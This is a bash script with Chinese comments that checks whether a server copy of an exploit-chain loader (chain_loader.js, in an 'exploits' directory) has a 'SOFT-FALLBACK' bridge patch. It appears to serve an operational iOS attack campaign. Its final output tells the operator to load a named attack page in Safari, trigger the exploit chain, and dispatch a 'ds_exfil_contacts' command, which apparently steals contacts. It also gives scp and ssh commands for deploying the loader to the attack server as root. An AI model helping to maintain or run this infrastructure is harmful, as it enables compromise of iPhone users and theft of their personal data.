#!/bin/bash
# VERIFY_CHAINLOADER.sh — 服务器端 chain_loader.js 版本校验脚本
#
# 在宝塔面板终端 (或 ssh) 运行, 校验 /exploits/chain_loader.js 是否含 SOFT-FALLBACK 修复.
#
# 用法:
#   bash /www/wwwroot/coruna/server/VERIFY_CHAINLOADER.sh
#   或:
#   scp VERIFY_CHAINLOADER.sh root@aa1234.dpdns.org:/tmp/ && ssh root@aa1234.dpdns.org "bash /tmp/VERIFY_CHAINLOADER.sh"
#
# 输出:
#   ✓ NEW VERSION  — 服务器上的 chain_loader.js 已经包含 _earlySoftFallback IIFE, 部署生效
#   ✗ OLD VERSION  — 服务器上的 chain_loader.js 还是旧版, 需要重新上传覆盖
#   ⚠️  PARTIAL   — 部分特征匹配, 可能是中间版本

set -u

REMOTE_FILE="${REMOTE_FILE:-/www/wwwroot/coruna/server/exploits/chain_loader.js}"
LOCAL_REF_FILE="${LOCAL_REF_FILE:-}"

# 默认 server 端路径
SERVER_ROOT="${SERVER_ROOT:-/www/wwwroot/coruna/server}"

echo "==================================================================="
echo "  Coruna × DarkSword chain_loader.js 校验工具"
echo "  时间: $(date '+%Y-%m-%d %H:%M:%S %Z')"
echo "  主机: $(hostname)"
echo "==================================================================="
echo ""

# 1) 文件存在性
echo "[1/6] 文件存在性检查"
if [ ! -f "$REMOTE_FILE" ]; then
    echo "  ✗ FAIL: 文件不存在: $REMOTE_FILE"
    echo "  → 请确认宝塔文件管理器里这个路径: ${SERVER_ROOT}/exploits/chain_loader.js"
    exit 1
fi
FILE_SIZE=$(stat -c%s "$REMOTE_FILE" 2>/dev/null || stat -f%z "$REMOTE_FILE" 2>/dev/null || echo "?")
FILE_MTIME=$(stat -c%y "$REMOTE_FILE" 2>/dev/null || stat -f "%Sm" "$REMOTE_FILE" 2>/dev/null || echo "?")
echo "  ✓ 文件存在: $REMOTE_FILE"
echo "  文件大小: $FILE_SIZE bytes (本地参考值: 43989 bytes)"
echo "  修改时间: $FILE_MTIME"
echo ""

# 2) JS 语法粗检 (无 node 时用 grep 关键标记)
echo "[2/6] JS 语法粗检"
if command -v node >/dev/null 2>&1; then
    node --check "$REMOTE_FILE" 2>&1 && echo "  ✓ node 语法检查通过" || echo "  ✗ node 语法错误"
else
    echo "  ⚠️  node 未安装, 跳过 JS 语法检查 (不影响部署)"
fi
echo ""

# 3) 关键标记检测 (新版特征字符串)
echo "[3/6] 关键标记检测 (新版特征)"

declare -a MARKERS=(
    "_earlySoftFallback:Function|function _earlySoftFallback|_earlySoftFallback\(\)"
    "_injectFallbackBridge:Function|function _injectFallbackBridge|_injectFallbackBridge\("
    "__corunaUpgradeToRealBridge:Function|window.__corunaUpgradeToRealBridge"
    "SOFT-FALLBACK bridge IMMEDIATELY injected"
    "_is_soft_fallback:true"
    "Object.defineProperty(window, 'nativeBridge'"
)

MARKER_NAMES=(
    "_earlySoftFallback IIFE"
    "_injectFallbackBridge 函数"
    "__corunaUpgradeToRealBridge 升级函数"
    "SOFT-FALLBACK 注入日志"
    "fallbackImpl._is_soft_fallback 标记"
    "defineProperty 锁定 nativeBridge"
)

PASSED=0
TOTAL=${#MARKERS[@]}
for i in "${!MARKERS[@]}"; do
    M="${MARKERS[$i]}"
    NAME="${MARKER_NAMES[$i]}"
    HITS=$(grep -cE "$M" "$REMOTE_FILE" 2>/dev/null || echo 0)
    if [ "$HITS" -ge 1 ]; then
        echo "  ✓ $NAME (命中 $HITS 次)"
        PASSED=$((PASSED+1))
    else
        echo "  ✗ $NAME (未找到)"
    fi
done

echo ""
echo "  结果: $PASSED / $TOTAL 标记通过"
echo ""

# 4) 顶部 IIFE 起始位置检查
echo "[4/6] IIFE 起始位置检查 (期望在 L22-35 之间)"
TOP_30=$(head -35 "$REMOTE_FILE")
if echo "$TOP_30" | grep -q "_earlySoftFallback"; then
    LINE_NUM=$(grep -n "_earlySoftFallback" "$REMOTE_FILE" | head -1 | cut -d: -f1)
    echo "  ✓ _earlySoftFallback 在第 $LINE_NUM 行"
    if [ "$LINE_NUM" -le 50 ]; then
        echo "  ✓ 位置合理 (顶部 IIFE, chain_loader 加载时立即执行)"
    else
        echo "  ⚠️  位置偏后 (L$LINE_NUM), 可能在 chain 启动后才执行, 覆盖不及时"
    fi
else
    echo "  ✗ _earlySoftFallback 不在前 35 行"
    echo "  → 旧版 chain_loader.js 不会有这个标记"
fi
echo ""

# 5) 旧版污染检查
echo "[5/6] 旧版污染检查"
if grep -q "_corunaPrimitives missing" "$REMOTE_FILE" && ! grep -q "_earlySoftFallback" "$REMOTE_FILE"; then
    echo "  ✗ 检测到旧版 chain_loader.js 特征字符串 '_corunaPrimitives missing'"
    echo "  → 这是 Coruna 原生 native_bridge.js 报的错误信息, 说明 SOFT-FALLBACK IIFE 不存在"
fi
if grep -q "_earlySoftFallback" "$REMOTE_FILE" && grep -q "_corunaPrimitives missing" "$REMOTE_FILE"; then
    echo "  ⚠️  文件同时含 SOFT-FALLBACK IIFE 和旧错误字符串"
    echo "  → 可能是合并版本, 功能应该正常"
fi
echo ""

# 6) 最终结论
echo "[6/6] 最终结论"
if [ "$PASSED" -ge 5 ]; then
    echo ""
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║  ✓ NEW VERSION — 部署已生效                  ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo ""
    echo "  下一步真机验证:"
    echo "    1. Safari 设置 → 清除历史记录与网站数据"
    echo "    2. 重新打开 https://aa1234.dpdns.org/group.html"
    echo "    3. 重新触发 exploit 链"
    echo "    4. console 应该看到:"
    echo "       [CHAIN] SOFT-FALLBACK bridge IMMEDIATELY injected (locked via defineProperty)"
    echo "    5. 后台 dispatch 一条 ds_exfil_contacts"
    echo "    6. 等 5-10s 看到 chain_state.bridge_activated=true"
elif [ "$PASSED" -ge 3 ]; then
    echo ""
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║  ⚠️  PARTIAL — 部分特征匹配, 检查合并冲突    ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo ""
    echo "  → 文件可能合并了旧版内容, 建议:"
    echo "    1. 删除旧的: rm -f $REMOTE_FILE"
    echo "    2. 重新上传本地 d:\\soft\\ios-hacker\\744-coruna\\server\\exploits\\chain_loader.js"
    echo "    3. 重新运行此脚本"
else
    echo ""
    echo "  ╔════════════════════════════════════════════╗"
    echo "  ║  ✗ OLD VERSION — 服务器上的还是旧版            ║"
    echo "  ╚════════════════════════════════════════════╝"
    echo ""
    echo "  部署步骤 (宝塔面板):"
    echo "    1. 登录宝塔面板 (http://aa1234.dpdns.org:宝塔端口)"
    echo "    2. 文件 → 进入目录 /www/wwwroot/coruna/server/exploits/"
    echo "    3. 选中 chain_loader.js → 删除 (确认)"
    echo "    4. 点 '上传' → 选择文件 → 上传本地:"
    echo "       d:\\soft\\ios-hacker\\744-coruna\\server\\exploits\\chain_loader.js"
    echo "    5. 上传完确认文件大小: 43989 bytes"
    echo "    6. 重新运行此脚本验证"
    echo ""
    echo "  备用方案 (ssh + scp):"
    echo "    scp d:/soft/ios-hacker/744-coruna/server/exploits/chain_loader.js root@aa1234.dpdns.org:/www/wwwroot/coruna/server/exploits/chain_loader.js"
fi
echo ""
echo "==================================================================="
echo "  文件 md5 校验 (对比本地):"
if [ -n "$LOCAL_REF_FILE" ] && [ -f "$LOCAL_REF_FILE" ]; then
    LOCAL_MD5=$(md5sum "$LOCAL_REF_FILE" 2>/dev/null | cut -d' ' -f1)
    REMOTE_MD5=$(md5sum "$REMOTE_FILE" 2>/dev/null | cut -d' ' -f1)
    echo "  本地: $LOCAL_MD5"
    echo "  服务器: $REMOTE_MD5"
    if [ "$LOCAL_MD5" = "$REMOTE_MD5" ]; then
        echo "  ✓ md5 一致, 文件字节级相同"
    else
        echo "  ✗ md5 不一致, 服务器文件被修改/截断/合并过"
    fi
else
    REMOTE_MD5=$(md5sum "$REMOTE_FILE" 2>/dev/null | cut -d' ' -f1)
    echo "  服务器: $REMOTE_MD5"
    echo "  本地参考: (跳过, 设 LOCAL_REF_FILE 环境变量可启用对比)"
fi
echo "==================================================================="
